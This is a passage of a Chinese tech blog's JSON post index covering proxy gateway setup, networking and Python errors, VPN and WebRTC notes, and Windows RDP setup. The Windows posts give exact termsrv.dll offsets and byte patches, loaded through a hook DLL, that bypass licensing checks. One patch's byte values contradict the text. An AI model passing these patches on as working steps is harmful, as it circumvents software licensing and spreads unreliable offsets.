CAP_DAC_OVERRIDE AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE Restart=always ExecStartPre=/usr/bin/sleep 1s ExecStart=/usr/local/bin/mihomo -d /etc/mihomo ExecReload=/bin/kill -HUP $MAINPID [Install] WantedBy=multi-user.target 再执行以下命令保存 systemd 文件：\n1 2 3 4 5 6 7 8 9 10 11 # 重新加载 systemd systemctl daemon-reload # 配置开机自启动 mihomo 服务 systemctl enable mihomo # 立即启动 mihomo systemctl start mihomo # 查看 mihomo 日志 journalctl -f -u mihomo.service 流量转发 为了方便引流，选择通过开启 TUN模式接管本机所有流量的方式实现。\n在配置文件中添加 TUN 模式，配置文件模板参考：https://wiki.metacubex.one/config/inbound/tun/\n下面是我个人使用的 TUN 配置：\n1 2 3 4 5 6 7 8 9 10 tun: stack: mixed device: Meta auto-route: true auto-detect-interface: true dns-hijack: - any:53 strict-route: false mtu: 1500 enable: true 添加 Web UI 在配置文件中添加：\n1 2 3 external-controller: 0.0.0.0:9090 # 如果需要本地访问则指定为 127.0.0.1 external-ui: ui external-ui-url: \u0026#34;https://github.com/MetaCubeX/metacubexd/archive/refs/heads/gh-pages.zip\u0026#34; 添加配置之后即可在网页端通过 http://127.0.0.1:9090/ui 访问控制界面。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ubuntu-%E8%BF%90%E8%A1%8C-clash-%E5%B9%B6%E4%BD%9C%E4%B8%BA%E6%97%81%E8%B7%AF%E7%BD%91%E5%85%B3/","title":"Ubuntu 运行 clash 并作为旁路网关"},{"content":"udp recvfrom: connection refused 问题 出错代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;net\u0026#34; ) func main() { udp, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, \u0026amp;net.UDPAddr{IP: net.ParseIP(\u0026#34;192.168.1.2\u0026#34;),Port: 2222}) if err != nil { panic(err) } _, err = udp.Write([]byte(\u0026#34;test\u0026#34;)) if err != nil { panic(err) } buff := make([]byte, 1024) _, _, err = udp.ReadFromUDP(buff) if err != nil { panic(err) } } 错误信息：\n1 2 3 4 5 6 panic: read udp 192.168.1.5:45529-\u0026gt;192.168.1.2:2222: recvfrom: connection refused goroutine 1 [running]: main.main() /root/udp.go:20 +0x177 exit status 2 问题原因 1 2 3 4 5 root@ubuntu:~# tcpdump -i enp1s0 host 192.168.1.2 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on enp1s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 10:36:06.764008 IP 192.168.1.5.60398 \u0026gt; 192.168.1.2.2222: UDP, length 4 10:36:06.764420 IP 192.168.1.2 \u0026gt; 192.168.1.5: ICMP 10.0.0.1 udp port 2222 unreachable, length 40 使用 tcpdump 抓包发现目标主机为给主机回复了一个 ICMP 包，用来指示 2222 端口不可达。\n根据《UNIX网络编程卷1：套接字联网API（第3版）》第八章第8.9小结所讲，这个 ICMP 错误被称为异步错误（asynchronous error）。\n该错误是由 sendto 引起（udp.Write函数内部实际调用了 unix 的sendto系统接口），但是 sendto 本身却返回成功。这个 ICMP 数据被送入了 UDP 套接字的接收缓冲区，当调用 recvfrom接口时返回错误。因此当程序调用 udp.ReadFromUDP时会抛出错误。\n根据错误分析可以发现，如果没有执行sendto操作，那么recvfrom则不会收到错误信息。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/udp-recvfrom-connection-refused-%E9%97%AE%E9%A2%98/","title":"udp recvfrom connection refused 问题"},{"content":"UnboundLocalError local variable ‘xxx‘ referenced before assignment 错误详情 在Python程序中引用函数时，有时会出现这样的错误：\nUnboundLocalError: local variable \u0026lsquo;xxx\u0026rsquo; referenced before assignment\n这个错误的意思是：局部变量赋值前被引用\n先看一下出错程序：\n1 2 3 4 5 def demo(): num += 1 num = 1 demo() 按照Python的内部空间分配来说，num是属于全局变量，在函数内部是能够读取到的。在下面的例子中就可以体现：\n1 2 3 4 5 def demo(): print(num) num = 1 demo() # 1 那么为什么还会出现异常呢？ 原来在Python中，函数内部对变量赋值进行修改后，该变量就会被Python解释器认为是局部变量而非全局变量。 （将num += 1重新书写为num = num + 1）当程序执行 num = num + 1 的时候，由于需要修改num 变量，因此num 已经成了局部变量。但在这之前 num 变量在函数空间中还没有定义，因此 num + 1中的num 变量出现错误。\n解决办法 1. 使用全局变量 1 2 3 4 5 6 def demo(): global num num += 1 num = 1 demo() 通过 global 关键字将 num 声明为全局变量，这样解释器就不会出现分辨不清楚变量的错误。\n2. 重新命名 1 2 3 4 5 def demo(): num1 = num + 1 num = 1 demo() 将 num 重新命名为 num1 ，num1 就为局部变量，Python解释器就不会将 num 误认为是局部变量。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/unboundlocalerror-local-variable-xxx-referenced-before-assignment/","title":"UnboundLocalError local variable ‘xxx‘ referenced before assignment"},{"content":"VM 虚拟机三种网络模式 VMware 作为一种使用极其广泛的虚拟机软件，它为我们提供了三种网络工作模式，它们分别是：Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式），三种网络模式都各自有各自的特点。\nBridged（桥接模式） VMnet0 默认桥接模式。桥接模式下虚拟机通过 VMnet0 虚拟交换机实现与物理机在同一个局域网中。在这种模式下，虚拟机和物理机能够互 ping，物理机能上网虚拟机也能够上网：\nHost-Only（仅主机模式） VMnet1 默认仅主机模式。仅主机模式下，虚拟机处于 VMnet1 虚拟路由器和虚拟交换机构建的网络中。该模式下，主机模式下的虚拟机，是一种与世隔绝的状态。由于没有去 Internet 的路由，因此虚拟机不能上网：\nNAT模式（网络地址转换模式） VMnet8 默认 NAT 模式。NAT 模式与仅主机模式十分相像，但是不同的是，使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。\n虚拟机向外部网络发送的请求数据 \u0026ldquo;包裹\u0026rdquo;，都会交由NAT网络适配器加上\u0026quot;特殊标记\u0026quot;并以主机的名义转发出去，外部网络返回的响应数据\u0026quot;包裹\u0026quot;，也是先由主机接收，然后交由NAT网络适配器根据\u0026quot;特殊标记\u0026quot;进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。\n在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的： 参考来源：\n桥接模式、NAT模式和仅主机模式_swadian2008的博客-CSDN博客_桥接模式和nat模式和仅主机模式\n三言两语说清VM虚拟机的三种网卡模式 - 知乎 (zhihu.com)\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/vm%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/","title":"VM虚拟机三种网络模式"},{"content":"VPN Kill Switch 安装VPN后，你可能会认为你的网络活动受到完全保护，不会黑客和防火长城的监视。对于你访问的每个网站，你传输的所有数据都通过VPN的安全加密隧道发送，因此不会被发现。\n但如果没有终止开关(Kill Switch)，你的数据依然不安全。\n如果VPN连接失败（例如服务器问题、Wi-Fi信号弱、网络过载等），那么你的设备可能会切换到常规的无保护连接。然后网站会获取你的真实IP地址，Wi-Fi热点可能会看到你正在访问的网站，并且VPN不会加密你的任何数据。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/vpn-kill-switch/","title":"VPN Kill Switch"},{"content":"VPN 流量分析 正常网络 TUN 网卡 VPN TUN 网卡是一个工作在三层网络（IP）的虚拟网卡。\n注意：下图中的 eth0 代表的 eth0 是在三层的 IP 地址，准确来说 eth0 是工作在二层网络的。\n对于没有代理全局路由的 VPN，VPN 应用在收到数据时直接根据路由规则将数据发送到实际物理网卡即可。但是对于代理了全部路由，或 VPN 路由和 VPN 服务器路由重叠时，VPN应用在发送数据时就会因为路由规则从而再次将数据发送回 VPN 网卡从而造成流量回环。\n此时为了避免流量回环，需要加一些额外的路由规则，例如 Wireguard 选择过滤自身流量，32765: not from all fwmark 0xca6c lookup 51820。也可以选择将套接字绑定到实际网卡直接进行发包。\nTAP 网卡 VPN TAP 网卡是一个工作在二层（数据链路层）的虚拟网卡，拥有自己的 MAC 地址和 IP 地址。TAP 网卡此时和物理网卡是极其相似的，只不过物理网卡拿到数据后会交给真实的物理设备，让物理设备将数据以信号的方式传递出去；TAP 拿到数据后不会将数据交给真实的物理设备，而是交给用户态的软件。\nTAP 网卡的 VPN 和 TUN 网卡工作流程是极其相似的，如下图所示：\nTAP 与 TUN 的区别 TAP 网卡与 TUN 最大的区别在于他们工作的层次不一样：TAP 网卡工作在数据链路层，TUN 网卡工作在网络层。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/vpn-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"VPN 流量分析"},{"content":"VSCode 阅读 Linux 内核源码 最终效果 Windows 使用 VSCode 通过 SSH 远程阅读 Linux 内核源码。\n搭建步骤 下载 Linux 源码，Linux 源码存放网站 https://cdn.kernel.org/pub/linux/kernel/:\n1 2 3 curl -L https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz -o /root/linux-5.15.tar.xz tar -xvf linux-5.15.tar.xz 在 Linux 主机上安装 global：\n1 apt install global 从 VSCode 插件市场下载 Remote - SSH 插件：\n使用 Remote - SSH 连接到 Linux，打开一个新的窗口，然后在远程主机上安装 C/C++ 和 C/C++ GNU Global 插件： 在 Settings 中配置 global 的路径，注意 gnuGlobal.objDirPrefix要提前创建好文件夹：\n1 2 3 4 5 { \u0026#34;gnuGlobal.globalExecutable\u0026#34;: \u0026#34;/usr/bin/global\u0026#34;, \u0026#34;gnuGlobal.gtagsExecutable\u0026#34;: \u0026#34;/usr/bin/gtags\u0026#34;, \u0026#34;gnuGlobal.objDirPrefix\u0026#34;: \u0026#34;/root/linux-5.15/.global\u0026#34; } 然后再配置 C/C++ include 路径：\n1 2 3 4 5 6 7 { ... \u0026#34;C_Cpp.default.includePath\u0026#34;: [ \u0026#34;.\u0026#34;, \u0026#34;./include\u0026#34; ] } 再在 VSCode 中按 Ctrl + Shift + P 执行 Global: Rebuild Gtags Database 命令。当出现 Build tag files successfully 时代表符号已经解析完毕。\n解析完毕后 gnuGlobal.objDirPrefix 路径下会生成如下文件：\n1 2 3 4 5 6 7 8 9 root@ubuntu:~/linux-5.15/.global# tree . └── root └── linux-5.15 ├── GPATH ├── GRTAGS └── GTAGS 2 directories, 3 files 上面步骤执行完毕后就可以使用 VSCode 进行愉快地查看 Linux 代码了！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/vscode-%E9%98%85%E8%AF%BB-linux-%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/","title":"VSCode 阅读 Linux 内核源码"},{"content":"WebRTC P2P 能力 P2P 连接流程 Signal Server: 用于协助双端数据交换； STUN：用于探测自身节点公网 IP + Port 和 自身所处 NAT 类型； TURN：中继服务器，用于转发中继流量。 P2P 能力 网络环境 WebRTC P2P 是否支持 IPv6 - IPv6 支持 Port Restricted Cone NAT - Port Restricted Cone NAT 支持 一端位于 NAT 下，一端位于 NAT 上 支持 Port Restricted Cone NAT - Symmetric NAT 不支持 具有爆破防护规则的防火墙 不支持 能够依靠 UPnP/NAT-PMP/PCP进行端口映射的路由器 不支持 Data Channel WebRTC 的 Data Channel 底层使用 SCTP 。SCTP 为你提供流，并且每个流都可以独立配置。WebRTC 数据通道只是基于流的简单抽象。有关持久性和顺序的设置会被直接传递到 SCTP Agent 中。\nData Channel 的通道类型具有以下可选属性：\nDATA_CHANNEL_RELIABLE (0x00) - 没有消息丢失，消息依序到达。 DATA_CHANNEL_RELIABLE_UNORDERED (0x80) - 没有消息丢失，但消息可能乱序到达。 DATA_CHANNEL_PARTIAL_RELIABLE_REXMIT (0x01) - 按照请求中的次数重试发送后，消息可能会丢失，但消息将依序到达。 DATA_CHANNEL_PARTIAL_RELIABLE_REXMIT_UNORDERED (0x81) - 按照请求中的次数重试发送后，消息可能会丢失，且消息可能乱序到达。 DATA_CHANNEL_PARTIAL_RELIABLE_TIMED (0x02) - 如果没有在请求的时间内到达，消息可能会丢失，但消息将依序到达。 DATA_CHANNEL_PARTIAL_RELIABLE_TIMED_UNORDERED (0x82) - 如果没有在请求的时间内到达，消息可能会丢失，且消息可能乱序到达。 libp2p 如何使用 WebRTC WebRTC Direct 1 2 3 4 5 6 7 const offerSdp = await peerConnection.createOffer() const mungedOfferSdp = sdp.munge(offerSdp, ufrag) await peerConnection.setLocalDescription(mungedOfferSdp) // construct answer sdp from multiaddr and ufrag const answerSdp = sdp.fromMultiAddr(ma, ufrag) await peerConnection.setRemoteDescription(answerSdp) 在 WebRTC Direct 中，libp2p 直接使用地址转换成 SDP 进行 WebRTC 连接。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/webrtc-p2p-%E8%83%BD%E5%8A%9B/","title":"WebRTC P2P 能力"},{"content":"Windows 个人版实现多用户远程登陆 在个人 Windows 版本中是不提供像Windows Server的多用户同时访问主机的功能。 不过我们可以通过 hook Windows 提供远程服务的 C:\\Windows\\System32\\termsrv.dll 库文件、修改相关注册表并提供依赖程序的方式可以使个人版本的Windows 提供多人同时访问主机的功能。\n实现环境：\nWindows版本：Windows 10 Education 20H2\n硬件平台：x64\ntermsrv.dll版本：10.0.19041.84\n多用户访问开启实现思路流程 通过修改注册表将原有的termsrv.dll文件入口重定向至hook程序的dll文件上（后称为A文件），A文件将自己伪装成termsrv.dll,并对外提供与原接口一致的API调用方法，A文件在runtime运行时的执行步骤如下：\n加载原有的termsrv.dll文件至内存\n根据预先调研好的设定配置位置及值，修改内存中termsrv.dll相对偏移位置的内存值，使其具备多用户远程登录能力\nA文件的对外API透传到修改后的termsrv.dll执行，使对外表现为开启多用户远程登陆特性，达成目的\n优点：不需要更改windows的原始dll文件，影响小，不具备破坏性。\n思路流程拆解 本流程实现中可以拆解为4个比较关键的步骤，分为4个关键小节依次进行说明具体实现\n修改注册表，将dll导流至hook.dll hook.dll加载termsrv.dll之内存后修改4个位置的内存值，使termsrv.dll开启多用户登录模式 在windows 注册表，配置正确的用户访问策略 检查有无远程访问所需的依赖程序及库文件，如果没有，提供并放至指定路径下 1、修改注册表，引流服务至hook.dll 2、hook termsrv.dll, 修改内存值，使其开启多用户模式 Hook 程序思路 termsrv.dll暴露了两个函数接口：ServiceMain和SvchostPushServiceGlobals，Hook 程序同样也需要暴露这两个函数接口。\n当系统调用 Hook 程序的这两个接口时，首先将 termsrv.dll动态库加载到内存，冻结进程和线程的状态。Hook 程序再根据偏移量找到对应的 termsrv.dll 在内存中需要 Patch 点的地址，对 Patch 点进行修改，再恢复进程和线程的状态，再去调用 termsrv.dll文件对应的函数接口。\n附：修改位置查找方法 需要使用 IDA 对 termsrv.dll文件进行分析，找到修改的位置和修改的内容。\n使用 IDA 打开 termsrv.dll， 找到 Header 值位置 180000000。\n✨Hook程序修改位置1：LocalOnlyPatch 函数：CEnforcementCore::GetInstanceOfTSLicense(_GUID \u0026amp;,ITSLicense * *)\n该函数主要会对本地的 License 进行判断，需要让该函数不进行判断直接进行跳转。\n修改内容：\n需要将该函数此处的比较跳转（JZ）修改为直接跳转（JMP）：\n修改前：\n.text:0000000180087611 jz short loc_180087657\t// 74 44 修改后：\n.text:0000000180087611 jmp short loc_180087657\t// EB 44 偏移量：180087611 - 180000000 = 87611\n✨Hook程序修改位置2：SingleUserPatch 函数：CSessionArbitrationHelperMgr::IsSingleSessionPerUserEnabled(int *)\n该函数会判断当前主机是否只允许单用户进行会话连接，需要让该函数判断为允许多用户连接。\n修改内容：\n需要将此处传入值 1 修改为 0： 修改前：\n.text:000000018000BFE0 mov dword ptr [rdx], 1\t// C7 02 00 00 00 00 修改后： .text:000000018000BFE0 mov dword ptr [rdx], 0\t// C7 02 01 00 00 00 偏移量：0BFE2\n✨Hook程序修改位置3：DefPolicyPatch 函数：CDefPolicy::Query(int *)\n该函数主要作用是设置最大远程连接数，这里让最大连接数设置为最大值（256）即可。\n修改内容：\n需要将修改此处的比较、跳转语句修改为直接重设寄存器值语句：\n修改前：\n此处根据具体比较的寄存器和执行的跳转语句执行不同的预设语句\n.text:0000000180017ED5 cmp [rcx+63Ch], eax\t\\\\ 39 81 3C 06 00 00 .text:0000000180017EDB jz loc_18002D0BA\t\\\\ 0F 84 D9\t51 01 00 修改后：\n.text:0000000180017ED5 mov eax, 100h\t\\\\ B8 00 01 00 00 .text:0000000180017EDA mov [rcx+638h], eax\t\\\\ 89 81 38 06 00 00 .text:0000000180017EE0 nop\t\\\\ 90 偏移量：17ED5\n✨Hook程序修改位置4：SLInitHook 函数：CSLQuery::Initialize(void) 修改内容： 通过全局关键字搜索找到该函数变量的存放区域： 变量的值需要重设为：\nbServerSku = 1 bRemoteConnAllowed = 1 bFUSEnabled = 1 bAppServerAllowed = 1 bMultimonAllowed = 1 lMaxUserSessions = 0 ulMaxDebugSessions = 0 bInitialized = 1 各变量的偏移量：\nbInitialized.x64 =103FF8 bServerSku.x64 =103FFC lMaxUserSessions.x64 =104000 bAppServerAllowed.x64 =104008 bRemoteConnAllowed.x64=104010 bMultimonAllowed.x64 =104014 ulMaxDebugSessions.x64=104018 bFUSEnabled.x64 =10401C 3、配置windows 远程注册表配置项 1. ServiceDll 服务端会根据该值查找处理 RDP 远程连接的 dll 库文件，我们需要将其替换为 Hook 的 dll 文件。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters -\u0026gt; ServiceDll\n原始值：%SystemRoot%\\System32\\termsrv.dll\n替换值：{{rdpwrap.dll文件 所在路径}}\n2. fDenyTSConnections 该值控制主机是否开启 Windows 远程桌面服务。true关闭远程服务，false开启远程服务。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server -\u0026gt; fDenyTSConnections\n3. EnableConcurrentSessions 该值会管理主机是否允许多个用户远程登录并同时使用服务器。true开启并发会话，false关闭并发会话。\n位置：\nComputer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core -\u0026gt; EnableConcurrentSessions\n4. AllowMultipleTSSessions 该值控制主机是否允许多终端服务会话。true允许多用户，false不允许多用户。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -\u0026gt; AllowMultipleTSSessions\n5. AddIns 位置：\n配置剪贴板和客户端端口的重定向器。\nClip Redirector：\n剪切板重定向器。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Clip Redirector DND Redirector：\nRDP 展示程序。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\DND Redirector Dynamic VC：\nDynamic Virtual Channel。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Dynamic VC 4、补全缺失的依赖程序 由于开启多用户能力后，相较于某些系统版本（家庭版），缺少部分远程桌面使用的文件，需要在对应的位置配置文件的拷贝，让远程桌面能力能完整对外服务\n1. rdpclip.exe 该程序用于剪切板重定向，用于同步客户端和服务端的剪切板。\n位置：%SystemRoot%\\System32\\rdpclip.exe\n2. rfxvmt.dll 该动态库包含远程桌面服务端程序。\n位置：%SystemRoot%\\System32\\rfxvmt.dll\n操作流程总结 提取所需文件，包括：rdpclip.exe(存在则不管)、rfxvmt.dll(存在则不管)和rdpwrap.dll(Hook 程序，必须放在系统级目录下，不可放在用户目录内，这里选择路径为C:\\Program Files\\Test\\rdpwrap.dll)；\n修改 ServiceDll注册表的值，将其替换为 Hook 程序的路径(C:\\Program Files\\Test\\rdpwrap.dll)；\n修改注册表的值，正确配置远程桌面服务；\n开启防火墙 3389 端口；\n杀死 TermService 服务的进程；\n启动 TermService 服务，服务启动后会根据 ServiceDll的值加载 rdpwrap.dll程序，rdowrap.dll 程序则会去 Hook termsrv.dll文件（如果在Windows 服务管理中 TermService 服务配置为自动，那么可以不用手动重启，Windows 会自动重启该服务\n2、hook termsrv.dll, 修改内存值，使其开启多用户模式 Hook 程序思路 termsrv.dll暴露了两个函数接口：ServiceMain和SvchostPushServiceGlobals，Hook 程序同样也需要暴露这两个函数接口。\n当系统调用 Hook 程序的这两个接口时，首先将 termsrv.dll动态库加载到内存，冻结进程和线程的状态。Hook 程序再根据偏移量找到对应的 termsrv.dll 在内存中需要 Patch 点的地址，对 Patch 点进行修改，再恢复进程和线程的状态，再去调用 termsrv.dll文件对应的函数接口。\n附：修改位置查找方法 需要使用 IDA 对 termsrv.dll文件进行分析，找到修改的位置和修改的内容。\n使用 IDA 打开 termsrv.dll， ，找到 Header 值位置 180000000。\n✨Hook程序修改位置1：LocalOnlyPatch 函数：CEnforcementCore::GetInstanceOfTSLicense(_GUID \u0026amp;,ITSLicense * *)\n该函数主要会对本地的 License 进行判断，需要让该函数不进行判断直接进行跳转。\n修改内容：\n需要将该函数此处的比较跳转（JZ）修改为直接跳转（JMP）：\n修改前：\n.text:0000000180087611 jz short loc_180087657\t// 74 44 修改后：\n.text:0000000180087611 jmp short loc_180087657\t// EB 44 偏移量：180087611 - 180000000 = 87611\n✨Hook程序修改位置2：SingleUserPatch 函数：CSessionArbitrationHelperMgr::IsSingleSessionPerUserEnabled(int *)\n该函数会判断当前主机是否只允许单用户进行会话连接，需要让该函数判断为允许多用户连接。\n修改内容：\n需要将此处传入值 1 修改为 0：\n修改前：\n.text:000000018000BF09 mov dword ptr [rax+8], 1\t// C7 40 08 01 00 00 00 修改后：\n.text:000000018000BF09 mov dword ptr [rax+8], 0\t// C7 40 08 00 00 00 00 偏移量：0BF09\n✨Hook程序修改位置3：DefPolicyPatch 函数：CDefPolicy::Query(int *)\n该函数主要作用是设置最大远程连接数，这里让最大连接数设置为最大值（256）即可。\n修改内容：\n需要将修改此处的比较、跳转语句修改为直接重设寄存器值语句：\n修改前：\n此处根据具体比较的寄存器和执行的跳转语句执行不同的预设语句\n.text:0000000180017ED5 cmp [rcx+63Ch], eax\t\\\\ 39 81 3C 06 00 00 .text:0000000180017EDB jz loc_18002D0BA\t\\\\ 0F 84 D9\t51 01 00 修改后：\n.text:0000000180017ED5 mov eax, 100h\t\\\\ B8 00 01 00 00 .text:0000000180017EDA mov [rcx+638h], eax\t\\\\ 89 81 38 06 00 00 .text:0000000180017EE0 nop\t\\\\ 90 偏移量：17ED5\n✨Hook程序修改位置4：SLInitHook 函数：CSLQuery::Initialize(void) 修改内容： 通过全局关键字搜索找到该函数变量的存放区域： 变量的值需要重设为：\nbServerSku = 1 bRemoteConnAllowed = 1 bFUSEnabled = 1 bAppServerAllowed = 1 bMultimonAllowed = 1 lMaxUserSessions = 0 ulMaxDebugSessions = 0 bInitialized = 1 各变量的偏移量：\nbInitialized.x64 =103FF8 bServerSku.x64 =103FFC lMaxUserSessions.x64 =104000 bAppServerAllowed.x64 =104008 bRemoteConnAllowed.x64=104010 bMultimonAllowed.x64 =104014 ulMaxDebugSessions.x64=104018 bFUSEnabled.x64 =10401C 3、配置windows 远程注册表配置项 1. ServiceDll 服务端会根据该值查找处理 RDP 远程连接的 dll 库文件，我们需要将其替换为 Hook 的 dll 文件。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters -\u0026gt; ServiceDll\n原始值：%SystemRoot%\\System32\\termsrv.dll\n替换值：{{rdpwrap.dll文件 所在路径}}\n2. fDenyTSConnections 该值控制主机是否开启 Windows 远程桌面服务。true关闭远程服务，false开启远程服务。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server -\u0026gt; fDenyTSConnections\n3. EnableConcurrentSessions 该值会控制服务端远程桌面服务是否启用并发会话。true开启并发会话，false关闭并发会话。\n位置：\nComputer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core -\u0026gt; EnableConcurrentSessions\n4. AllowMultipleTSSessions 该值控制主机是否允许多用户会话。true允许多用户，false不允许多用户。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -\u0026gt; AllowMultipleTSSessions\n5. AddIns 位置：\n配置剪贴板和客户端端口的重定向器。\nClip Redirector：\n剪切板重定向器。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Clip Redirector DND Redirector：\nRDP 展示程序。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\DND Redirector Dynamic VC：\nDynamic Virtual Channel。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Dynamic VC\n4、补全缺失的依赖程序 由于开启多用户能力后，相较于某些系统版本（家庭版），缺少部分远程桌面使用的文件，需要在对应的位置配置文件的拷贝，让远程桌面能力能完整对外服务\n1. rdpclip.exe 该程序用于剪切板重定向，用于同步客户端和服务端的剪切板。\n位置：%SystemRoot%\\System32\\rdpclip.exe\n2. rfxvmt.dll 该动态库包含远程桌面服务端程序。\n位置：%SystemRoot%\\System32\\rfxvmt.dll\n操作流程总结 提取所需文件，包括：rdpclip.exe(存在则不管)、rfxvmt.dll(存在则不管)和rdpwrap.dll(Hook 程序，必须放在系统级目录下，不可放在用户目录内，这里选择路径为C:\\Program Files\\Test\\rdpwrap.dll)；\n修改 ServiceDll注册表的值，将其替换为 Hook 程序的路径(C:\\Program Files\\Test\\rdpwrap.dll)；\n修改注册表的值，正确配置远程桌面服务；\n开启防火墙 3389 端口；\n杀死 TermService 服务的进程；\n启动 TermService 服务，服务启动后会根据 ServiceDll的值加载 rdpwrap.dll程序，rdowrap.dll 程序则会去 Hook termsrv.dll文件（如果在Windows 服务管理中 TermService 服务配置为自动，那么可以不用手动重启，Windows 会自动重启该服务 Windows 个人版开启单用户多会话 通过上面的操作，主机已经实现了不同用户的同时访问。但是如果不同会话以同一用户身份进行访问，会导致先连接的会话被后连接的会话挤掉。\n在完成上述步骤的基础上，通过再修改下列注册表配置项实现单用户多会话连接。\nMaxInstance\n配置最大会话数量\n位置：Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services -\u0026gt; MaxInstance\nfSingleSessionPerUser\n开启单用户多会话模式。true代表关闭单用户多会话模式，false代表开启单用户多会话模式。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server -\u0026gt; fSingleSessionPerUser\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/windows-%E4%B8%AA%E4%BA%BA%E7%89%88%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/","title":"Windows 个人版实现多用户远程登陆"},{"content":"Windows 共享个人应用 Windows Server版拥有发布本地的应用为Remote App的能力。用户可以在本机使用远程主机上的应用，除Server版以外的Windows版本都默认不支持该功能，但通过下列操作可以使普通Windows同样开启此能力。\n实验环境：\nWindows版本：Windows 10 Education 20H2\n硬件平台：x64\ntermsrv.dll版本：10.0.19041.84\n一、Windows 开启多用户同时访问 在个人 Windows 版本中是不提供像Windows Server的多用户同时访问主机的功能。如果不开启多用户访问功能，Windows桌面只能被一个用户连接，其他用户访问主机时，当前占据桌面的用户会被挤掉。\n可以通过 hook Windows 提供远程服务的 C:\\Windows\\System32\\termsrv.dll 库文件、修改相关注册表并提供依赖程序的方式可以使个人版本的Windows 提供多人同时访问主机的功能。\n多用户访问开启实现思路流程 通过修改注册表将原有的termsrv.dll文件入口重定向至hook程序的dll文件上（后称为A文件），A文件将自己伪装成termsrv.dll,并对外提供与原接口一致的API调用方法，A文件在runtime运行时的执行步骤如下：\n加载原有的termsrv.dll文件至内存\n根据预先调研好的设定配置位置及值，修改内存中termsrv.dll相对偏移位置的内存值，使其具备多用户远程登录能力\nA文件的对外API透传到修改后的termsrv.dll执行，使对外表现为开启多用户远程登陆特性，达成目的\n优点：不需要更改windows的原始dll文件，影响小，不具备破坏性。\n思路流程拆解 本流程实现中可以拆解为4个比较关键的步骤，分为4个关键小节依次进行说明具体实现\n修改注册表，将dll导流至hook.dll hook.dll加载termsrv.dll之内存后修改4个位置的内存值，使termsrv.dll开启多用户登录模式 在windows 注册表，配置正确的用户访问策略 检查有无远程访问所需的依赖程序及库文件，如果没有，提供并放至指定路径下 1、修改注册表，引流服务至hook.dll 2、hook termsrv.dll, 修改内存值，使其开启多用户模式 Hook 程序思路 termsrv.dll暴露了两个函数接口：ServiceMain和SvchostPushServiceGlobals，Hook 程序同样也需要暴露这两个函数接口。\n当系统调用 Hook 程序的这两个接口时，首先将 termsrv.dll动态库加载到内存，冻结进程和线程的状态。Hook 程序再根据偏移量找到对应的 termsrv.dll 在内存中需要 Patch 点的地址，对 Patch 点进行修改，再恢复进程和线程的状态，再去调用 